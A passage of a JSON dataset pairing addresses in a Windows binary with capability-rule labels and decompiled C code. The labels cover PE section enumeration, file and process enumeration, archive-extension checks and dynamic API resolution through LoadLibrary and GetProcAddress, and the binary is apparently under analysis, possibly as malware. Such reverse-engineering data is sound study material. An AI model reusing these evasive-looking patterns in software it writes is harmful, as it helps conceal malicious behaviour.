0xc));\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 433
    },
    "00414fb1": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.00414fb1(uint param_1)\n\n{\n    uchar uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_ESI;\n    \n    *(unaff_ESI + 0x30) = 0;\n    *(unaff_ESI + 8) = 0;\n    *(unaff_ESI + 0x10) = 0;\n    *(unaff_ESI + 0x14) = 0x201;\n    *(unaff_ESI + 0x18) = 6;\n    *(unaff_ESI + 0x1c) = 0;\n    *(unaff_ESI + 0x20) = 0;\n    *(unaff_ESI + 0x24) = 0;\n    *(unaff_ESI + 0x28) = 0;\n    *(unaff_ESI + 0x2c) = 0;\n    *(unaff_ESI + 0xc) = 0;\n    puVar2 = fcn.0041e85d(4);\n    if (puVar2 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        uVar3 = fcn.0041dada();\n        *puVar2 = uVar3;\n        fcn.0041d899();\n        fcn.0040e1d6();\n    }\n    *(unaff_ESI + 0x30) = puVar2;\n    *(unaff_ESI + 0x38) = param_1;\n    *(unaff_ESI + 0x3c) = 0;\n    uVar1 = fcn.004150da(unaff_ESI, 0x20);\n    *(unaff_ESI + 0x40) = uVar1;\n    if (*(unaff_ESI + 0x38) == 0) {\n        fcn.0041416b(4, 0);\n    }\n    return;\n}\n",
        "token_count": 431
    },
    "00415098": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.00415098(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x20) = in_EAX + 0x18;\n    *(in_EAX + 0x24) = in_EAX + 0x1c;\n    *(in_EAX + 0x30) = in_EAX + 0x28;\n    *(in_EAX + 0x10) = in_EAX + 8;\n    *(in_EAX + 0x34) = in_EAX + 0x2c;\n    *(in_EAX + 0x14) = in_EAX + 0xc;\n    *(in_EAX + 0xc) = 0;\n    **(in_EAX + 0x24) = 0;\n    **(in_EAX + 0x34) = 0;\n    **(in_EAX + 0x10) = 0;\n    **(in_EAX + 0x20) = 0;\n    **(in_EAX + 0x30) = 0;\n    return;\n}\n",
        "token_count": 243
    },
    "00418f18": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418f18(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.004208c8(4);\n    iVar1 = *(unaff_EBP + 8);\n    puVar2 = fcn.0041fdf8();\n    *(iVar1 + 8) = 0;\n    *(iVar1 + 0x10) = 0;\n    *(iVar1 + 0x14) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.0041df96();\n    uVar3 = fcn.00418fcd();\n    *(iVar1 + 8) = uVar3;\n    fcn.0041df96();\n    uVar3 = fcn.00418fcd();\n    *(iVar1 + 0x10) = uVar3;\n    fcn.0041df96();\n    uVar3 = fcn.00418fcd();\n    *(iVar1 + 0x14) = uVar3;\n    fcn.0041df96();\n    *(iVar1 + 0xc) = **puVar2;\n    fcn.0041df96();\n    *(iVar1 + 0xd) = *puVar2[1];\n    fcn.0041df96();\n    *(iVar1 + 0xc) = 0x2e;\n    fcn.0041df96();\n    *(iVar1 + 0xd) = 0x2c;\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 367
    },
    "0041b8d0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.0041b8d0(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    uint var_1h;\n    \n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    iVar1 = *(unaff_ESI + 0x18);\n    if (iVar1 != 0) {\n        iVar1 = fcn.0041c68b(unaff_ESI + 0x148, iVar1);\n    }\n    if (iVar1 == *(unaff_ESI + 0x18)) {\n        if ((*(unaff_ESI + 0x1c) != 0) &&\n           (iVar1 = fcn.0041c68b(*(unaff_ESI + 0x13c), *(unaff_ESI + 0x1c)),  iVar1 != *(unaff_ESI + 0x1c))) {\n            return 10;\n        }\n        return 0;\n    }\n    return 10;\n}\n",
        "token_count": 758
    },
    "0041bb32": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.0041bb32(void)\n\n{\n    uint var_1h;\n    \n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    return 0;\n}\n",
        "token_count": 330
    },
    "0041bc57": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.0041bc57(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    uint var_1h;\n    \n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    fcn.0041c68b(&var_1h, 1);\n    iVar1 = *(unaff_ESI + 0x18);\n    if (iVar1 != 0) {\n        iVar1 = fcn.0041c68b(unaff_ESI + 0x148, iVar1);\n    }\n    if (iVar1 != *(unaff_ESI + 0x18)) {\n        return 10;\n    }\n    if ((*(unaff_ESI + 0x20) != 0) &&\n       (iVar1 = fcn.0041c68b(*(unaff_ESI + 0x140), *(unaff_ESI + 0x20)),  iVar1 != *(unaff_ESI + 0x20))) {\n        return 10;\n    }\n    if ((*(unaff_ESI + 0x24) != 0) &&\n       (iVar1 = fcn.0041c68b(*(unaff_ESI + 0x144), *(unaff_ESI + 0x24)),  iVar1 != *(unaff_ESI + 0x24))) {\n        return 10;\n    }\n    return 0;\n}\n",
        "token_count": 1117
    },
    "0041d41d": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0041d41d(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    \n    fcn.00420895(4);\n    puVar1 = fcn.0041e85d(0x4098);\n    if (puVar1 == NULL) {\n        puVar1 = NULL;\n    }\n    else {\n        *puVar1 = 0;\n        puVar1[1] = 0;\n        *(puVar1 + 2) = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        puVar1[8] = 0;\n        *(puVar1 + 0xb) = 0;\n        puVar1[0xf] = 0;\n        puVar1[0x11] = 0;\n        puVar1[0x12] = 0;\n        puVar1[0x1f] = 0;\n    }\n    *0x4467a0 = fcn.0041c5e6();\n    if (*0x4467a0 == 0) {\n        puVar2 = fcn.0041e85d(8);\n        *puVar2 = 2;\n        puVar2[1] = puVar1;\n    }\n    else if (puVar1 != NULL) {\n        fcn.0041d49e();\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 342
    },
    "00406148": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.00406148(void)\n\n{\n    uint32_t *puVar1;\n    int32_t in_EAX;\n    \n    if ((in_EAX != 0) && (puVar1 = *(in_EAX + 0x1c),  puVar1 != NULL)) {\n        *(in_EAX + 0x14) = 0;\n        *(in_EAX + 8) = 0;\n        *(in_EAX + 0x18) = 0;\n        *puVar1 = -(puVar1[3] != 0) & 7;\n        fcn.00404c82();\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 152
    },
    "0041c2b2": {
        "rules": [
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0041c2b2(int32_t param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_1 + 8) & 0xfffd | 2;\n    fcn.0041c26c();\n    return (uVar1 ^ 1) * uVar1 >> 8 ^ param_2;\n}\n",
        "token_count": 93
    },
    "0042e2b1": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0042e2b1(void)\n\n{\n    *0x444290 = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x436fe4, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 65
    },
    "00403f50": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00403f50(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00403fb5(param_1, pcVar2 - (param_1 + 1));\n    return;\n}\n",
        "token_count": 103
    },
    "004042b6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004042b6(uint arg_8h, char *arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint var_4h;\n    \n    pcVar2 = arg_ch;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00404546(arg_ch);\n    fcn.00403ef2();\n    return arg_8h;\n}\n",
        "token_count": 121
    },
    "00407e21": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407e21(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    char *pcVar5;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(4);\n    puVar2 = fcn.0041e85d(0x244);\n    *(unaff_EBP + -0x10) = puVar2;\n    *(unaff_EBP + -4) = 0;\n    if (puVar2 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        *puVar2 = 0;\n        puVar2[1] = 0xffffffff;\n        puVar2[0x4d] = 0xffffffff;\n        puVar2[0x4e] = 0;\n        puVar2[0x4f] = 0;\n        iVar3 = fcn.0041d661(1);\n        pcVar5 = 0x43bd76;\n        puVar2[0x4e] = iVar3;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5[iVar3 + -0x43bd76] = cVar1;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    *0x44663c = fcn.004073a9(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    if (*0x44663c == 0) {\n        puVar4 = fcn.0041e85d(8);\n        *puVar4 = 1;\n        puVar4[1] = puVar2;\n    }\n    else if (puVar2 != NULL) {\n        fcn.00407ec4();\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 473
    },
    "0040bfb7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040bfb7(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.0040c013(param_1, param_2, pcVar2 - (param_2 + 1));\n    return;\n}\n",
        "token_count": 113
    },
    "0040c23f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040c23f(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.0040c291(param_2);\n    return;\n}\n",
        "token_count": 97
    },
    "0040c322": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c322(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.004208c8(4);\n    fcn.0040c263();\n    *(unaff_EBP + -4) = 0;\n    while (*(unaff_EBP + 0xc) != *(unaff_EBP + 0x10)) {\n        fcn.0040c377();\n        *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 1;\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 153
    },
    "004161f5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nvoid fcn.004161f5(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_158h;\n    uint var_150h;\n    uint var_134h;\n    uint var_2ch;\n    uint var_4h;\n    \n    fcn.004208fe(0x14c);\n    *(unaff_EBP + -0x158) = 0x128;\n    uVar1 = (**0x4464f0)(2, 0);\n    iVar2 = (**0x446360)(uVar1, unaff_EBP + -0x158);\n    if (iVar2 != 0) {\n        while (iVar2 = (**0x446438)(uVar1, unaff_EBP + -0x158),  iVar2 != 0) {\n            (**0x4464ac)();\n            (**0x4464ac)();\n            (**0x4464ac)();\n            fcn.004166c2(*(unaff_EBP + -0x150));\n            *(unaff_EBP + -4) = 0;\n            (**0x4464ac)();\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00403f73(1, 0);\n            (**0x4464ac)();\n        }\n    }\n    (**0x446344)(uVar1);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 348
    },
    "00416a28": {
        "rules": [
            "contain loop",
            "enumerate files on windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00416a28(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint hFindFile;\n    uint lpFindFileData;\n    uint var_26ch;\n    uint var_48h;\n    uint var_2ch;\n    uint var_4h;\n    \n    fcn.004208fe(0x298);\n    *(unaff_EBP + -0x2a0) = 0;\n    *(unaff_EBP + -0x2a4) = unaff_EBX;\n    *(unaff_EBP + -4) = 1;\n    puVar1 = fcn.00416865(unaff_EBP + -0x48);\n    if (7 < puVar1[5]) {\n        puVar1 = *puVar1;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(puVar1, unaff_EBP + -0x298);\n    *(unaff_EBP + -0x29c) = uVar2;\n    fcn.0040c0f0(1);\n    *unaff_EBX = 0;\n    unaff_EBX[1] = 0;\n    unaff_EBX[2] = 0;\n    *(unaff_EBP + -0x2a0) = 1;\n    fcn.004162b1(unaff_EBP + -0x26c);\n    *(unaff_EBP + -4) = 2;\n    fcn.00417861();\n    while( true ) {\n        *(unaff_EBP + -4) = 1;\n        fcn.0040c0f0(1);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(*(unaff_EBP + -0x29c), unaff_EBP + -0x298);\n        if (iVar3 == 0) break;\n        fcn.004162b1(unaff_EBP + -0x26c);\n        *(unaff_EBP + -4) = 3;\n        fcn.00417861();\n    }\n    fcn.00403f73(1, 0);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 548
    },
    "00418fcd": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00418fcd(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    char *pcVar2;\n    int32_t iVar3;\n    \n    pcVar2 = in_EAX;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    pcVar2 = pcVar2 + (1 - (in_EAX + 1));\n    iVar3 = fcn.0041d661(pcVar2);\n    if (pcVar2 != NULL) {\n        iVar3 = iVar3 - in_EAX;\n        do {\n            in_EAX[iVar3] = *in_EAX;\n            in_EAX = in_EAX + 1;\n            pcVar2 = pcVar2 + -1;\n        } while (pcVar2 != NULL);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "0041c2dc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar fcn.0041c2dc(void)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *unaff_EDI;\n    \n    iVar1 = (**0x4463a4)();\n    for (pcVar2 = unaff_EDI + iVar1; (unaff_EDI < pcVar2 && (*pcVar2 != '.')); pcVar2 = pcVar2 + -1) {\n    }\n    if ((pcVar2 == unaff_EDI) && (*pcVar2 != '.')) {\n        return '\\0';\n    }\n    iVar1 = (**0x4464dc)(pcVar2, 0x43eed4);\n    if (iVar1 != 0) {\n        iVar1 = (**0x4464dc)(pcVar2, \".zip\");\n        if (iVar1 != 0) {\n            iVar1 = (**0x4464dc)(pcVar2, \".zoo\");\n            if (iVar1 != 0) {\n                iVar1 = (**0x4464dc)(pcVar2, \".arc\");\n                if (iVar1 != 0) {\n                    iVar1 = (**0x4464dc)(pcVar2, \".lzh\");\n                    if (iVar1 != 0) {\n                        iVar1 = (**0x4464dc)(pcVar2, \".arj\");\n                        if (iVar1 != 0) {\n                            iVar1 = (**0x4464dc)(pcVar2, 0x43eef8);\n                            if (iVar1 != 0) {\n                                iVar1 = (**0x4464dc)(pcVar2, \".tgz\");\n                                return '\\x01' - (iVar1 != 0);\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return '\\x01';\n}\n",
        "token_count": 384
    },
    "0041d661": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041d661(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *apcStack20 [3];\n    char *pcStack8;\n    \n    do {\n        iVar2 = fcn.0041e0ea(param_1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00423651(param_1);\n    } while (iVar2 != 0);\n    if ((*0x444cbc & 1) == 0) {\n        *0x444cbc = *0x444cbc | 1;\n        pcStack8 = \"bad allocation\";\n        fcn.0041e17e(&pcStack8);\n        *0x444cb0 = vtable.std::bad_alloc.0;\n        fcn.0041eeb1(0x433000);\n    }\n    fcn.0041e28b(0x444cb0);\n    apcStack20[0] = vtable.std::bad_alloc.0;\n    fcn.00420046(apcStack20, 0x4403d8);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 268
    },
    "0041f2e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t * fcn.0041f2e0(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar1 = param_1 & 3;\n    while (uVar1 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar1 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar1 = *param_1;\n            uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;\n            puVar5 = param_1 + 1;\n            if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar5;\n            if ((uVar3 & 0x81010100) != 0) {\n                if ((uVar3 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar1 = *param_1;\n        if (uVar1 == param_2) {\n            return param_1;\n        }\n        if (uVar1 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar1 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar5;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 593
    },
    "00424701": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00424701(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00425be0(0x4400a0, 0xc);\n    fcn.00426252(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x445678;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x445674;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00424745;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0041e0b0(arg_8h_00);\ncode_r0x00424745:\n        fcn.0041e0b0(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00424768();\n    fcn.00425c25();\n    return;\n}\n",
        "token_count": 395
    },
    "00418ffe": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00418ffe(void)\n\n{\n    code *pcVar1;\n    \n    *0x4464f8 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(*0x445b40);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (*0x4464f8 != 0) {\n        *0x4464a0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x4464f8, *0x445c20);\n        *0x446400 = (*pcVar1)(*0x4464f8, *0x445eb8);\n        *0x4464ac = (**0x446400)(*0x4464f8, *0x4461b4);\n        *0x44631c = (**0x446400)(*0x4464f8, *0x445d58);\n        *0x446448 = (**0x446400)(*0x4464f8, *0x445ab8);\n        *0x446410 = (**0x446400)(*0x4464f8, *0x446248);\n        *0x446528 = (**0x446400)(*0x4464f8, *0x445c44);\n        *0x4464e0 = (**0x446400)(*0x4464f8, *0x445d94);\n        *0x446458 = (**0x446400)(*0x4464f8, *0x445e68);\n        *0x446380 = (**0x446400)(*0x4464f8, *0x446170);\n        *0x446480 = (**0x446400)(*0x4464f8, *0x446000);\n        *0x446454 = (**0x446400)(*0x4464f8, *0x445b28);\n        *0x446484 = (**0x446400)(*0x4464f8, *0x44621c);\n    }\n    *0x4462e4 = (**0x4464a0)(*0x4460e4);\n    if (*0x4462e4 != 0) {\n        *0x4463d8 = (**0x446400)(*0x4462e4, *0x446004);\n    }\n    return;\n}\n",
        "token_count": 508
    }
}